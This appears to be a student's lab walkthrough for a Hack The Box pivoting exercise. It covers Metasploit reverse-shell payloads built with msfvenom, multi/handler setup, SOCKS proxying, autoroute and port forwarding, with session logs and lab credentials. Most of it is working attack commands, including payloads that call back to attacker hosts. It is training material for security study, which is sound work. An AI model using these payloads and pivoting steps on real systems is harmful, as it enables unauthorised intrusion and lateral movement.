
### Create payload for a pivot host

```python
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.252 -f elf -o backupjob LPORT=8080
```

### Configuring & Starting the multi/handler

```python
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

>[!note] Copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and > execute it to gain a Meterpreter session.

### Execute payload on pivot host

```python
chmod +x backupjob 
```

```python
./backup
```

NOTE: Upon execution, ensure the metepreter session is fully established

### Meterpeter Session Establishment

```python
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd
/home/ubuntu
```

### Ping Sweep

**Facts**

- Windows target is on the 172.16.5.0/23 network
- Windows firewall is allowing ICMP requests
- Meterpeter's `ping_sweep` module can generate ICMP traffic from the Ubuntu host to the network

```python
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Ping Sweep via For Loop
^ping-for-loop

**Linux Hosts**

```go
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Windows - CMD**

```go
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Windows - PowerShell

```go
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

#### Circumvent Firewall blocking ICMP requests (pings)

^ping-blocks

Meterpreter's socks_proxy module, a post-exploitation module can be used to forward traffic to our local proxy on your attack host.

Configure SOCKS version 4a to start a listener on port `9050` and route all the traffic received via our Meterpreter session.

### Configuring MSF's SOCKS Proxy

```go
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options
Module options (auxiliary/server/socks_proxy):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

#### Confirm Proxy Server is Running

```python
msf6 auxiliary(server/socks_proxy) > jobs
Jobs
====
  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

>[! Hint] Now configure proxychains to route traffic generated by other tools lthrough our pivot on the compromised Ubuntu host. Add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
> 
>>
>```python
>socks4 127.0.0.1 9050


NOTE: You may need to change socks4 to socks5 in proxychains.conf, depending on the server version

#### Route all the traffic via your Meterpreter session
^autoroute
Use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic. ^95727f

#### Creating Routes with AutoRoute

```python
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

#### Listing Active Routes with AutoRoute

Use the `-p` option to list the active routes

```python
meterpreter > run autoroute -p
```

Below, verify proxychain routed Nmap traffic via your Meterpreter session

#### Testing Proxy & Routing Functionality

```python
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Port Forwarding

Use Meterpreter's `portfwd` module to do Port Forwarding. Enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

#### Creating a Local TCP Relay

```python
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

-l 3300: start a listener on attack host local port 3300

-p 3389 -r 172.16.5.19: send all packets to remote port 3389 on the remote host 172.16.5.19

Test if the above worked by remoting into the Windows machine:

```python
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Meterpreter Reverse Port Forwarding

Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host

#### Reverse Port Forwarding Rules

```python
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

NOTE: forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081

#### Configuring & Starting multi/handler

```python
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run
```

Create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

#### Generate the Windows Payload

```python
datboyblu3@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

After executing the Windows payload.....

#### Establish Meterpreter Session

```python
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\>
```

****

## Questions

IP
```go
10.129.244.34
```

Username
```go
ubuntu
```

Password
```go
HTB_@cademy_stdnt!
```

SSH
```go
ssh ubuntu@10.129.90.142
```


### 1) What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host?


Follow the steps to perform the ping sweep, like [[#Ping Sweep via For Loop|Ping For Loop]]  

Create the msfvenom payload:
```go
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.252 -f elf -o backupjob LPORT=8080
```

scp the file to the ubuntu pivot host
```go
scp backupjob ubuntu@10.129.90.142:\tmp
```

I used the meterpreter module `ping_sweep`
```go
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

The two IP addresses are:
^answer1
```go
172.16.5.19
```

```go
172.16.5.129
```

### 2) Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host?

Reference the [[#^95727f|autoroute]] 

==Starting the attack chain over since I'm restarting this session on a different day==

Create payload
```go
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.53 -f elf -o backupjob LPORT=8080
```

Set executable permissions on `backupjob` file.
```go
sudo chmod +x backupjob
```

Copy file over to ubuntu target
```go
scp backupjob ubuntu@10.129.90.142:/tmp
```

Start metasploit on attacker host. Set localhost to `0.0.0.0` 
```go
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Executing the payload on the ubuntu target will grant us a meterpreter shell
```go
./tmp/backupjob
```

In [[#^answer1|question 1]] I obtained the two IP addresses after executing a ping sweep. In the same window, `bg` the active shell and continue with the below

## Use Metasploit for post-exploitation routing via the `socks_proxy` module

### Configuring MSF's SOCKS Proxy
```go
use auxiliary/server/socks_proxy
```

set srvport
```go
set SRVPORT 9050
```

set srvhost
```go
set SRVHOST 0.0.0.0
```

set version
```go
set version 4a
```

run
```go
run
```

Verify proxy server is running
```go
jobs
```

Also verify that `socks4 	127.0.0.1 9050` is present at the end of `/etc/proxychains.conf`
Remember to `bg` your current session!

Route all traffic via Meterpreter with `autoroute`. This will add routes for `172.16.5.0` and then route all our proxychain traffic
```go
use post/multi/manage/autoroute
```

set the session
```go
set SESSION 1
```

set the subnet
```go
set SUBNET 172.16.5.0
```

run
```go
run
```

None of this worked, but the below did

After backgrounding your session with `bg`, attach to session 1 to run `autoroute`
```go
sessions -i 1
```

```go
run autoroute -s 172.16.5.0/23
```


